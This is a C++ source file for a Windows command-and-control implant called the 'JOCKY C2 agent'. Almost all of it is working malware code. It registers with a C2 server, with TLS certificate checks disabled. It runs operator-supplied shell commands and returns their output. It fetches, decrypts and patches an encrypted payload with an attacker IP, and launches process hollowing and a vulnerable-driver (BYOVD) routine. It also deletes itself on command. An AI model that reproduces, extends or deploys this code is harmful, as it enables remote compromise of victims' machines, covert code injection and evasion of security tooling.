// agent.cpp — JOCKY C2 agent (task dispatch + payload delivery)
//
// Build from directSyscall/ (assemble syscall_stub.obj first):
//
//   cl /nologo /O2 /MT agent.cpp ^
//      ..\byovd\client\client.cpp ^
//      ..\processhollowing\hollow.cpp ^
//      syscall_stub.obj ^
//      /link /SUBSYSTEM:CONSOLE /OUT:jocky_agent.exe ^
//      ws2_32.lib winhttp.lib crypt32.lib bcrypt.lib ^
//      kernel32.lib advapi32.lib ntdll.lib
//
// Compile-time overrides:
//   /DC2_HOST=L"c2.jocky.online"
//   /DC2_PORT=443
//   /DPOLL_INTERVAL_MS=30000
//   /DATTACKER_IP="192.168.1.10"
//   /DAES_KEY_HEX="6a6f636b795f..."   (64 hex chars = 32 bytes)

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

// Forward declarations from the other translation units.
int   RunClientPipeline();  // byovd/client/client.cpp
DWORD RunHollowPipeline();  // processhollowing/hollow.cpp

// ── Config ────────────────────────────────────────────────────────────────────
#ifndef C2_HOST
#define C2_HOST L"127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 443
#endif
#ifndef POLL_INTERVAL_MS
#define POLL_INTERVAL_MS 30000
#endif
#ifndef ATTACKER_IP
#define ATTACKER_IP "127.0.0.1"
#endif
// Default key: "jocky_dev_aes_key_jocky_dev_aesk" (32 bytes) as hex
#ifndef AES_KEY_HEX
#define AES_KEY_HEX "6a6f636b795f6465765f6165735f6b65795f6a6f636b795f6465765f6165736b"
#endif
// hollow.cpp hardcodes this path; payload must land here.
// C:\Windows\Temp is writable by all users (BUILTIN\Users has WD).
#ifndef PAYLOAD_PATH
#define PAYLOAD_PATH "C:\\Windows\\Temp\\payload.exe"
#endif

// ── Minimal JSON helpers ──────────────────────────────────────────────────────

static std::string JsonGetStr(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\":\"";
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos += needle.size();
    size_t end = json.find('"', pos);
    if (end == std::string::npos) return "";
    return json.substr(pos, end - pos);
}

static int JsonGetInt(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\":";
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return 0;
    pos += needle.size();
    while (pos < json.size() && json[pos] == ' ') pos++;
    if (pos >= json.size()) return 0;
    return atoi(json.c_str() + pos);
}

static std::string JsonGetRaw(const std::string& json, const std::string& key,
                               size_t startPos = 0) {
    std::string needle = "\"" + key + "\":";
    size_t pos = json.find(needle, startPos);
    if (pos == std::string::npos) return "{}";
    pos += needle.size();
    while (pos < json.size() && json[pos] == ' ') pos++;
    if (pos >= json.size()) return "{}";

    if (json[pos] == '{') {
        int depth = 0;
        size_t start = pos;
        for (size_t i = pos; i < json.size(); i++) {
            if (json[i] == '{') depth++;
            else if (json[i] == '}') { depth--; if (depth == 0) return json.substr(start, i - start + 1); }
        }
        return "{}";
    } else if (json[pos] == '"') {
        size_t start = pos;
        size_t end = json.find('"', pos + 1);
        if (end == std::string::npos) return "";
        return json.substr(start, end - start + 1);
    } else {
        size_t start = pos;
        size_t end = json.find_first_of(",]}", pos);
        if (end == std::string::npos) end = json.size();
        return json.substr(start, end - start);
    }
}

static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:   if (c < 0x20) out += ' '; else out += c;
        }
    }
    return out;
}

// ── WinHTTP ───────────────────────────────────────────────────────────────────

static HINTERNET g_session = nullptr;
static HINTERNET g_connect = nullptr;

static bool HttpInit() {
    g_session = WinHttpOpen(L"JockyAgent/1.0",
                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_session) return false;
    g_connect = WinHttpConnect(g_session, C2_HOST, C2_PORT, 0);
    return g_connect != nullptr;
}

struct HttpResp { DWORD status; std::string body; };

static HttpResp HttpDo(const wchar_t* method, const wchar_t* path,
                        const std::string& body, const std::string& token) {
    HttpResp resp{};
    HINTERNET hReq = WinHttpOpenRequest(
        g_connect, method, path, nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) return resp;

    DWORD secFlags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA       |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID  |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    std::wstring hdrs = L"Content-Type: application/json\r\n";
    if (!token.empty()) {
        hdrs += L"Authorization: Bearer ";
        for (unsigned char c : token) hdrs += (wchar_t)c;
        hdrs += L"\r\n";
    }

    const void* pBody = body.empty() ? nullptr : body.c_str();
    DWORD nBody       = body.empty() ? 0 : (DWORD)body.size();

    if (!WinHttpSendRequest(hReq, hdrs.c_str(), (DWORD)hdrs.size(),
                            (LPVOID)pBody, nBody, nBody, 0)) {
        WinHttpCloseHandle(hReq); return resp;
    }
    if (!WinHttpReceiveResponse(hReq, nullptr)) {
        WinHttpCloseHandle(hReq); return resp;
    }

    DWORD code = 0, sz = sizeof(code);
    WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &code, &sz, WINHTTP_NO_HEADER_INDEX);
    resp.status = code;

    DWORD avail = 0;
    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
        std::string chunk((size_t)avail, '\0');
        DWORD nRead = 0;
        WinHttpReadData(hReq, &chunk[0], avail, &nRead);
        resp.body.append(chunk.data(), nRead);
    }
    WinHttpCloseHandle(hReq);
    return resp;
}

// ── Crypto helpers ────────────────────────────────────────────────────────────

static bool HexDecode(const char* hex, uint8_t* out, size_t outLen) {
    for (size_t i = 0; i < outLen; i++) {
        auto nib = [](char c) -> int {
            if (c >= '0' && c <= '9') return c - '0';
            if (c >= 'a' && c <= 'f') return c - 'a' + 10;
            if (c >= 'A' && c <= 'F') return c - 'A' + 10;
            return -1;
        };
        int hi = nib(hex[i * 2]), lo = nib(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) return false;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return true;
}

// Base64 decode (RFC 4648) via crypt32.
static bool Base64Decode(const std::string& b64, std::vector<uint8_t>& out) {
    DWORD needed = 0;
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                               CRYPT_STRING_BASE64, nullptr, &needed, nullptr, nullptr))
        return false;
    out.resize(needed);
    DWORD actual = needed;
    return CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                                 CRYPT_STRING_BASE64, (BYTE*)out.data(), &actual,
                                 nullptr, nullptr) != FALSE;
}

// AES-256-CBC decrypt; first 16 bytes of input are the IV (server prepends it).
static bool AesDecrypt(const uint8_t* key32, const std::vector<uint8_t>& input,
                        std::vector<uint8_t>& output) {
    if (input.size() < 17) return false;

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) return false;

    const wchar_t* mode = BCRYPT_CHAIN_MODE_CBC;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)mode, (ULONG)((wcslen(mode) + 1) * sizeof(wchar_t)), 0);

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
                                         (PUCHAR)key32, 32, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }

    // Extract IV from first 16 bytes.
    uint8_t iv[16];
    memcpy(iv, input.data(), 16);
    const uint8_t* ct  = input.data() + 16;
    ULONG          ctl = (ULONG)(input.size() - 16);

    ULONG plainLen = 0;
    BCryptDecrypt(hKey, (PUCHAR)ct, ctl, nullptr, (PUCHAR)iv, 16,
                  nullptr, 0, &plainLen, BCRYPT_BLOCK_PADDING);
    // BCryptDecrypt mutates iv on the sizing call; restore it.
    memcpy(iv, input.data(), 16);

    output.resize(plainLen);
    status = BCryptDecrypt(hKey, (PUCHAR)ct, ctl, nullptr, (PUCHAR)iv, 16,
                           (PUCHAR)output.data(), plainLen, &plainLen, BCRYPT_BLOCK_PADDING);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(status)) return false;
    output.resize(plainLen);
    return true;
}

// Overwrite the 64-byte "ATTACKER_IP_HERE" placeholder in the payload PE.
static void PatchIp(std::vector<uint8_t>& payload, const char* ip) {
    static const char placeholder[] = "ATTACKER_IP_HERE";
    const size_t plen = strlen(placeholder);
    for (size_t i = 0; i + plen <= payload.size(); i++) {
        if (memcmp(payload.data() + i, placeholder, plen) == 0) {
            memset(payload.data() + i, 0, 64);
            size_t iplen = strlen(ip);
            if (iplen > 63) iplen = 63;
            memcpy(payload.data() + i, ip, iplen);
            return;
        }
    }
    // Not found: payload was pre-patched — that's fine.
}

// ── Shell execution ───────────────────────────────────────────────────────────

static std::string RunShell(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
    HANDLE hR, hW;
    if (!CreatePipe(&hR, &hW, &sa, 0)) return "(pipe failed)";
    SetHandleInformation(hR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hW;
    si.hStdError  = hW;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi{};
    std::string full = "cmd.exe /C " + cmd;
    std::vector<char> buf(full.begin(), full.end());
    buf.push_back('\0');

    if (!CreateProcessA(nullptr, buf.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hR);
        CloseHandle(hW);
        return "(CreateProcess failed: " + std::to_string(GetLastError()) + ")";
    }
    CloseHandle(hW); // must close after CreateProcess so ReadFile sees EOF when child exits

    std::string out;
    char tmp[4096];
    DWORD nr;
    while (ReadFile(hR, tmp, sizeof(tmp) - 1, &nr, nullptr) && nr > 0)
        out.append(tmp, nr);

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hR);

    if (out.size() > 8192) { out.resize(8192); out += "\n[truncated]"; }
    return out;
}

// ── Agent state ───────────────────────────────────────────────────────────────

static std::string g_agentId;
static std::string g_token;
static std::string g_lastSha256;
static uint8_t     g_aesKey[32] = {};

// ── Registration ──────────────────────────────────────────────────────────────

static bool AgentRegister() {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD hnLen = sizeof(hostname);
    GetComputerNameA(hostname, &hnLen);

    std::string ipAddr = "0.0.0.0";
    {
        WSADATA wsa{};
        if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) {
            SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s != INVALID_SOCKET) {
                sockaddr_in tgt{};
                tgt.sin_family      = AF_INET;
                tgt.sin_port        = htons(80);
                tgt.sin_addr.s_addr = inet_addr("8.8.8.8");
                if (connect(s, (sockaddr*)&tgt, sizeof(tgt)) == 0) {
                    sockaddr_in local{}; int len = sizeof(local);
                    if (getsockname(s, (sockaddr*)&local, &len) == 0)
                        ipAddr = inet_ntoa(local.sin_addr);
                }
                closesocket(s);
            }
            WSACleanup();
        }
    }

    std::string body =
        "{\"hostname\":\"" + JsonEscape(hostname) + "\","
        "\"ip_address\":\"" + JsonEscape(ipAddr) + "\","
        "\"metadata\":{\"os\":\"Windows\",\"arch\":\"x64\"}}";

    auto resp = HttpDo(L"POST", L"/api/v1/agent/register", body, "");
    if (resp.status != 201) {
        printf("[-] Register HTTP %lu: %s\n", resp.status, resp.body.c_str());
        return false;
    }

    g_agentId = JsonGetStr(resp.body, "agent_id");
    g_token   = JsonGetStr(resp.body, "auth_token");

    if (g_agentId.empty() || g_token.empty()) {
        printf("[-] Register: missing agent_id/auth_token\n%s\n", resp.body.c_str());
        return false;
    }

    printf("[+] Registered  agent_id=%s  host=%s  ip=%s\n",
           g_agentId.c_str(), hostname, ipAddr.c_str());
    return true;
}

// ── Payload delivery pipeline ─────────────────────────────────────────────────

static void PayloadPoll() {
    auto resp = HttpDo(L"GET", L"/api/v1/payload/status", "", g_token);
    if (resp.status != 200) return;

    std::string sha256 = JsonGetStr(resp.body, "sha256");
    int chunkCount     = JsonGetInt(resp.body, "chunk_count");

    if (sha256.empty() || chunkCount <= 0 || sha256 == g_lastSha256) return;

    printf("[*] New payload  sha256=%.16s...  chunks=%d\n",
           sha256.c_str(), chunkCount);

    // 1. Fetch and concatenate all base64 chunks.
    std::string allB64;
    for (int i = 0; i < chunkCount; i++) {
        wchar_t path[128];
        swprintf_s(path, 128, L"/api/v1/payload/chunk/%d", i);
        auto cr = HttpDo(L"GET", path, "", g_token);
        if (cr.status != 200) {
            printf("[-] Chunk %d HTTP %lu\n", i, cr.status);
            return;
        }
        allB64 += JsonGetStr(cr.body, "data");
    }

    // 2. Base64 decode.
    std::vector<uint8_t> decoded;
    if (!Base64Decode(allB64, decoded)) { printf("[-] Base64 decode failed\n"); return; }

    // 3. AES-256-CBC decrypt (IV prepended as first 16 bytes).
    // Server pipeline: payload → AES-encrypt(IV||ct) → base64 → chunks.
    // No compression layer; AES provides the required obfuscation.
    std::vector<uint8_t> payload;
    if (!AesDecrypt(g_aesKey, decoded, payload)) { printf("[-] AES decrypt failed\n"); return; }

    // 4. Patch ATTACKER_IP_HERE placeholder.
    PatchIp(payload, ATTACKER_IP);

    // 6. Write to disk at the path hollow.cpp expects.
    HANDLE hf = CreateFileA(PAYLOAD_PATH, GENERIC_WRITE, 0, nullptr,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot write payload: %lu\n", GetLastError());
        return;
    }
    DWORD written = 0;
    WriteFile(hf, (LPCVOID)payload.data(), (DWORD)payload.size(), &written, nullptr);
    CloseHandle(hf);

    if (written != (DWORD)payload.size()) {
        printf("[-] Partial payload write (%lu/%zu)\n", written, payload.size());
        return;
    }

    printf("[+] Payload written (%lu bytes) — launching hollow pipeline\n", written);

    // 7. Hollow inject.
    DWORD pid = RunHollowPipeline();
    if (pid > 4)
        printf("[+] Hollowed PID %lu\n", pid);
    else
        printf("[-] Hollow pipeline failed\n");

    // Only advance cursor on a fully successful delivery.
    g_lastSha256 = sha256;
}

// ── Task dispatch ─────────────────────────────────────────────────────────────

static void DispatchTask(const std::string& taskId,
                          const std::string& commandType,
                          const std::string& payload) {
    printf("[*] Task %s  type=%s\n", taskId.c_str(), commandType.c_str());

    std::string resultJson;

    if (commandType == "shell") {
        std::string cmd = JsonGetStr(payload, "cmd");
        if (cmd.empty()) resultJson = "{\"error\":\"no cmd field\"}";
        else {
            printf("[*] Executing: %s\n", cmd.c_str());
            resultJson = "{\"output\":\"" + JsonEscape(RunShell(cmd)) + "\"}";
        }
    } else if (commandType == "hollow") {
        DWORD pid = RunHollowPipeline();
        if (pid <= 4) resultJson = "{\"error\":\"hollow failed\"}";
        else          resultJson = "{\"hollowed_pid\":" + std::to_string(pid) + "}";
    } else if (commandType == "byovd") {
        int rc = RunClientPipeline();
        resultJson = "{\"exit_code\":" + std::to_string(rc) + "}";
    } else if (commandType == "self_destruct") {
        // Delete payload from disk.
        DeleteFileA(PAYLOAD_PATH);
        // Schedule own deletion: we can't delete a running .exe directly.
        // A deferred cmd.exe handles it after we exit.
        char selfPath[MAX_PATH];
        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
        char delCmd[MAX_PATH + 80];
        snprintf(delCmd, sizeof(delCmd),
                 "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q \"%s\"", selfPath);
        STARTUPINFOA si2 = {0}; si2.cb = sizeof(si2);
        PROCESS_INFORMATION pi2 = {0};
        CreateProcessA(NULL, delCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
        resultJson = "{\"status\":\"self_destruct_initiated\"}";
    } else {
        resultJson = "{\"error\":\"unknown command_type\"}";
    }

    std::string body =
        "{\"task_id\":\"" + taskId + "\","
        "\"log_type\":\"event\","
        "\"data\":" + resultJson + "}";

    auto resp = HttpDo(L"POST", L"/api/v1/agent/telemetry", body, g_token);
    if (resp.status == 202)
        printf("[+] Telemetry accepted for task %s\n", taskId.c_str());
    else
        printf("[-] Telemetry HTTP %lu for task %s\n", resp.status, taskId.c_str());

    if (commandType == "self_destruct")
        ExitProcess(0);
}

static void AgentPoll() {
    auto resp = HttpDo(L"GET", L"/api/v1/agent/poll", "", g_token);
    if (resp.status == 429) return;
    if (resp.status != 200) { printf("[-] Poll HTTP %lu\n", resp.status); return; }

    const std::string& body = resp.body;
    size_t search = 0;
    int count = 0;

    while (true) {
        size_t idPos = body.find("\"task_id\":\"", search);
        if (idPos == std::string::npos) break;

        size_t idStart = idPos + 11;
        size_t idEnd   = body.find('"', idStart);
        if (idEnd == std::string::npos) break;
        std::string taskId = body.substr(idStart, idEnd - idStart);

        std::string cmdType;
        size_t ctPos = body.find("\"command_type\":\"", idPos);
        if (ctPos != std::string::npos && ctPos < idPos + 512) {
            size_t ctStart = ctPos + 16;
            size_t ctEnd   = body.find('"', ctStart);
            cmdType = body.substr(ctStart, ctEnd - ctStart);
        }

        std::string payload = JsonGetRaw(body, "payload", idPos);

        if (!taskId.empty() && !cmdType.empty()) {
            DispatchTask(taskId, cmdType, payload);
            count++;
        }
        search = idEnd + 1;
    }

    if (count > 0) printf("[+] %d task(s) dispatched\n", count);
}

// ── Entry point ───────────────────────────────────────────────────────────────

int main() {
    printf("[*] JOCKY agent  C2=%ls:%d  poll=%dms\n", C2_HOST, C2_PORT, POLL_INTERVAL_MS);

    HexDecode(AES_KEY_HEX, g_aesKey, 32);

    if (!HttpInit()) {
        printf("[-] WinHTTP init failed: %lu\n", GetLastError());
        return 1;
    }

    for (int attempt = 0; attempt < 5; attempt++) {
        if (attempt) { printf("[*] Retry %d in 10 s...\n", attempt); Sleep(10000); }
        if (AgentRegister()) goto registered;
    }
    printf("[-] Could not register after 5 attempts — exiting\n");
    return 1;

registered:
    printf("[*] Poll loop started\n");
    while (true) {
        PayloadPoll();  // check for new payload → fetch, decrypt, decompress, patch, hollow
        AgentPoll();    // drain operator task queue (shell / byovd / hollow)
        Sleep(POLL_INTERVAL_MS);
    }
}
